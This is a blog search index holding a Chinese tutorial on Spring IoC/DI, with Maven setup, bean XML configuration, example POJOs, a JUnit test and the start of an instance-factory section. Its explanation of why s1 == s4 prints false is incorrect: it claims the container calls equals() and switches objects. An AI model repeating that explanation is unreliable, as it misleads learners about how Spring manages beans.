<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java  Spring</title>
    <url>/2024/08/02/Spring_1/</url>
    <content><![CDATA[<h1 id="Spring：全功能栈的应用程序框架"><a href="#Spring：全功能栈的应用程序框架" class="headerlink" title="Spring：全功能栈的应用程序框架"></a>Spring：全功能栈的应用程序框架</h1><h2 id="各模块介绍"><a href="#各模块介绍" class="headerlink" title="各模块介绍"></a>各模块介绍</h2><p><img src="https://s2.loli.net/2024/08/24/oRvECwd6YUb9B2D.png" alt="image-20240824163015790"></p>
<p><strong>Test</strong></p>
<p>对应 spring-test.jar。 Spring 提供的测试工具，可以整合 Junit 测试，简化测试环节。</p>
<p><strong>Core Container</strong></p>
<p>Spring 的核心组件，包含了 Spring 框架最基本的支撑。</p>
<p>Beans，对应 spring-beans.jar，Spring 进行对象管理时依赖的jar包。</p>
<p>Core，对应 spring-core.jar，Spring 核心 jar 包。</p>
<p>Context，对应 spring-context.jar，Spring 容器上下文对象。</p>
<p>SpEL，对应 spring-expression.jar，Spring 表达式语言。</p>
<p><strong>AOP</strong></p>
<p>面向切面编程，对应 spring-aop.jar。</p>
<p><strong>Aspects</strong></p>
<p>AspectJ 的具体实现，面向切面编程的另一种实现。对应 spring-aspects.jar。</p>
<p><strong>Instrumentation</strong></p>
<p>服务器代理接口的具体实现。对应 spring-instrument.jar。 </p>
<p><strong>Messaging</strong></p>
<p>集成 messaging api 和消息协议提供支持。对应 spring-messaging.jar。</p>
<p><strong>Data Access&#x2F;Integration</strong></p>
<p>Spring 对数据访问层的封装。</p>
<p>JDBC，对应 spring-jdbc.jar。Spring 对 jdbc 的封装，当需要使用 spring 连接数据库时使用。 spring-jdbc.jar 需要依赖 spring-tx.jar。</p>
<p>Transactions，对应 spring-tx.jar。事务管理。</p>
<p>ORM，对应 spring-orm.jar。spring 整合第三方 orm 框架需要使用的 jar 包，例如 Hibernate 框架。</p>
<p><strong>Web</strong></p>
<p>Spring 对 javax 下的接口或类做的扩展功能。</p>
<p>spring-web.jar，对Servlet，filter，Listener等做的增强。</p>
<p>spring-webmvc.jar，实际上就是 SpringMVC 框架。需要依赖 spring 环境和 spring-web.jar。</p>
<h2 id="Spring-IoC-DI"><a href="#Spring-IoC-DI" class="headerlink" title="Spring IoC&#x2F;DI"></a>Spring IoC&#x2F;DI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>IoC（Inversion of Control）中文名称：控制反转。也被称为DI（dependency injection）依赖注入。</p>
<p>属于同一件事情的两个名称。</p>
<p>IoC&#x2F;DI 是指一个过程：对象的创建仅仅通过 Spring 容器负责，Spring 容器可以通过对象的构造方法或工厂方法进行实例化对象。在创建对象过程中，如果对象需要依赖其他对象，也可以直接在 Spring 容器中注入到当前对象。</p>
<p>整个过程中对象本身在容器中控制自己的实例化（所以叫做控制反转），通过构造方法或 setter 方法把依赖对象注入到自己（所以又叫做依赖注入）。</p>
<h3 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h3><p>容器（Container）：放置所有管理对象的对象。其本质是在容器对象里面有一个全局 Map 对象，map 对象中放置所有被管理的对象。Spring 中容器是指 ApplicationContext 接口及子接口或实现类。</p>
<p>beans：容器中所有被管理的对象称为 beans。如果单说其中一个对象可称为 bean。</p>
<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>创建普通 Maven 项目，并命名为 MySpring。</p>
<h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><p><img src="https://s2.loli.net/2024/08/24/BhLDZxW5clqMdRC.png" alt="image-20240824164824818"></p>
<p>在项目的 pom.xml 中添加 Spring 项目的最基本依赖。</p>
<p>Spring 项目想要运行起来必须包含:</p>
<ul>
<li>spring-context.jar。spring 上下文依赖，它依赖了下面的四个 jar。</li>
<li>spring-core.jar。Spring 核心 jar 包。它依赖了 spring-jcl.jar</li>
<li>spring-aop.jar。Spring AOP 基本支持。</li>
<li>spring-expression.jar。Spring 的表达式语言支持。</li>
<li>spring-beans.jar。Spring 容器的 bean 管理。</li>
<li>spring-jcl.jar。Spring 4 版本时是 common-logging.jar。从 5 开始 Spring 自己对日志进行了封装。</li>
</ul>
<p>所以在 Maven 中想要使用 Spring 框架只需要在项目中导入 spring-context 就可以了，其他的 jar 包根据 Maven 依赖传递性都可以导入进来：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 为了后续的测试也导入 junit --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建-Spring-配置文件"><a href="#创建-Spring-配置文件" class="headerlink" title="创建 Spring 配置文件"></a>创建 Spring 配置文件</h3><p>在 src&#x2F;main&#x2F;resources 下新建 applicationContext.xml 文件。</p>
<blockquote>
<p>文件名称没有强制要求。官方示例中配置文件名称叫做 applicationContext.xml，所以我们也把 Spring 配置文件叫做 applicationContext.xml</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">		使用 xsd 来约束 XML 配置文件的写法，是在根标签上写 xmlns 相关配置。</span></span><br><span class="line"><span class="comment">		xml name space 名字空间。</span></span><br><span class="line"><span class="comment">		xmlns:xsi 一般都是固定的，不需要改变的。</span></span><br><span class="line"><span class="comment">		xsi:schemaLocation 当前的 XML 配置文件，使用哪一个 xsd 文件来约束。</span></span><br><span class="line"><span class="comment">		内容是唯一的名称（一般是一个 http 地址）这个 xsd 文件的在线访问地址</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h3><p>在 src&#x2F;main&#x2F;java 下新建 pojo.Student.java 文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; books;</span><br><span class="line">    <span class="keyword">private</span> String[] hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; friends; <span class="comment">// key是唯一标记，value是朋友的姓名</span></span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games; <span class="comment">// 喜欢的游戏</span></span><br><span class="line">    <span class="keyword">private</span> Phone phone;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;创建一个Student对象，使用无参构造方法创建对象。&quot;</span>);</span><br><span class="line">        id = <span class="number">1</span>;</span><br><span class="line">        name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">        age = <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 有参构造</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(Integer id, String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;有三个参数(Integer id, String name, int age)的构造方法运行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInfo</span><span class="params">(Properties info)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(Phone phone)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setPhone方法运行，参数是：&quot;</span> + phone);</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, books=&quot;</span> + books +</span><br><span class="line">                <span class="string">&quot;, hobbies=&quot;</span> + Arrays.toString(hobbies) +</span><br><span class="line">                <span class="string">&quot;, friends=&quot;</span> + friends +</span><br><span class="line">                <span class="string">&quot;, games=&quot;</span> + games +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) o;</span><br><span class="line">        <span class="keyword">return</span> age == student.age &amp;&amp;</span><br><span class="line">                Objects.equals(id, student.id) &amp;&amp;</span><br><span class="line">                Objects.equals(name, student.name) &amp;&amp;</span><br><span class="line">                Objects.equals(books, student.books) &amp;&amp;</span><br><span class="line">                Arrays.equals(hobbies, student.hobbies) &amp;&amp;</span><br><span class="line">                Objects.equals(friends, student.friends) &amp;&amp;</span><br><span class="line">                Objects.equals(games, student.games);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Objects.hash(id, name, age, books, friends, games);</span><br><span class="line">        result = <span class="number">31</span> * result + Arrays.hashCode(hobbies);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> books;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBooks</span><span class="params">(List&lt;String&gt; books)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.books = books;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getHobbies() &#123;</span><br><span class="line">        <span class="keyword">return</span> hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobbies</span><span class="params">(String[] hobbies)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobbies = hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getFriends</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFriends</span><span class="params">(Map&lt;String, Object&gt; friends)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;String&gt; <span class="title function_">getGames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> games;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGames</span><span class="params">(Set&lt;String&gt; games)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.games = games;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同理创建 Phone.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Phone</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String phoneNo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Phone</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Phone&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, phoneNo=&#x27;&quot;</span> + phoneNo + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Phone</span> <span class="variable">phone</span> <span class="operator">=</span> (Phone) o;</span><br><span class="line">        <span class="keyword">return</span> Objects.equals(id, phone.id) &amp;&amp;</span><br><span class="line">                Objects.equals(phoneNo, phone.phoneNo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(id, phoneNo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPhoneNo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> phoneNo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhoneNo</span><span class="params">(String phoneNo)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.phoneNo = phoneNo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Bean-实例化的两种方式"><a href="#Bean-实例化的两种方式" class="headerlink" title="Bean 实例化的两种方式"></a>Bean 实例化的两种方式</h2><p>在 Spring 中实例化 Bean 有两种方式：</p>
<ul>
<li>通过构造方法进行实例化。默认使用无参构造。这种方式和以前 new 的方式是等效的。</li>
<li>通过工厂进行实例化。可以通过静态工厂和实例工厂进行实例化。这种方式完全是根据设计模式中工厂模式的思想而研发出的。Spring 考虑到如果需要频繁实例化某个类的对象，工厂模式无疑是一个好选择。</li>
</ul>
<h3 id="构造方法实例化"><a href="#构造方法实例化" class="headerlink" title="构造方法实例化"></a>构造方法实例化</h3><p>在 applicationContext.xml 中配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- bean标签</span></span><br><span class="line"><span class="comment">	代表配置一个类型，并基于这个类型，让spring的容器管理一个bean对象。</span></span><br><span class="line"><span class="comment">	属性：</span></span><br><span class="line"><span class="comment">	id：这个bean的全局唯一标记。</span></span><br><span class="line"><span class="comment">	name：这个bean的别名，可以有若干各，用逗号分隔。要求全局唯一。</span></span><br><span class="line"><span class="comment">	class：这个bean对象的具体类型是什么。 使用包名.类名赋值</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;stu1, stu2,stu3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;stu4, stu5,stu6&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意这里的 name 不能重复，否则会报错 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>在 src&#x2F;test&#x2F;java 中创建 TestSpring.java 从而进行测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSpring</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testContainer</span><span class="params">()</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 基于配置文件创建容器对象</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;========== 容器创建完毕 ==========&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从容器中获取需要的 bean 对象。根据 bean 的名字获取。唯一名称或别名都可以</span></span><br><span class="line">        <span class="comment">// getBean 方法的返回值类型是 Object</span></span><br><span class="line">        <span class="comment">// 强制转换</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> (Student) context.getBean(<span class="string">&quot;student1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 基于getBean的重载方法，指定要的bean对象类型是什么。</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;stu1&quot;</span>, Student.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试其他类型的获取</span></span><br><span class="line">        <span class="comment">// Object obj = context.getBean(&quot;stu1&quot;, Integer.class);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s3</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;stu2&quot;</span>, Student.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据 bean 对象的类型，从容器中获取对象。</span></span><br><span class="line">        <span class="comment">// 如果这个类型的对象不存在：抛出异常</span></span><br><span class="line">        <span class="comment">// 如果这个类型的对象有一个：返回这个对象</span></span><br><span class="line">        <span class="comment">// 如果这个类型的对象有多个：抛出异常</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s4</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;student2&quot;</span>, Student.class);</span><br><span class="line">        <span class="comment">//Integer i = context.getBean(Integer.class);</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;s1 : &quot;</span> + s1);</span><br><span class="line">        System.out.println(<span class="string">&quot;s2 : &quot;</span> + s2);</span><br><span class="line">        System.out.println(<span class="string">&quot;s3 : &quot;</span> + s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;s4 : &quot;</span> + s4);</span><br><span class="line">        System.out.println(s1 == s4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// System.out.println(&quot;obj : &quot; + obj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">创建一个Student对象，使用无参构造方法创建对象。</span><br><span class="line">创建一个Student对象，使用无参构造方法创建对象。</span><br><span class="line">========== 容器创建完毕 ==========</span><br><span class="line">s1 : Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br><span class="line">s2 : Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br><span class="line">s3 : Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br><span class="line">s4 : Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br><span class="line">false</span><br></pre></td></tr></table></figure>

<p>为什么返回 false ？</p>
<p>容器中创建若干 bean 对象，容器管理这些 bean 对象时，会检查是否同类型，如果同类型，尝试调用 equals。<br>如果对象等价（equals 返回 true）。那么 getBean 会返回同一个对象。当使用时，如果有冲突，则底层切换具体对象。没有冲突直接使用。</p>
<h3 id="工厂实例化"><a href="#工厂实例化" class="headerlink" title="工厂实例化"></a>工厂实例化</h3><h4 id="实例工厂"><a href="#实例工厂" class="headerlink" title="实例工厂"></a>实例工厂</h4><h5 id="创建工厂类"><a href="#创建工厂类" class="headerlink" title="创建工厂类"></a>创建工厂类</h5><p>在 src&#x2F;main&#x2F;java 下创建 factory 软件包，创建 StudentInstanceFactory 类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 学生实例工厂</span></span><br><span class="line"><span class="comment"> *  这个工厂，必须先创建对象，再调用方法，才能创建学生对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentInstanceFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StudentInstanceFactory</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;创建了学生实例工厂对象。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 工厂方法。调用即返回对象student。</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="配置-bean"><a href="#配置-bean" class="headerlink" title="配置 bean"></a>配置 bean</h5><p>在 applicationContext.xml 中配置：</p>
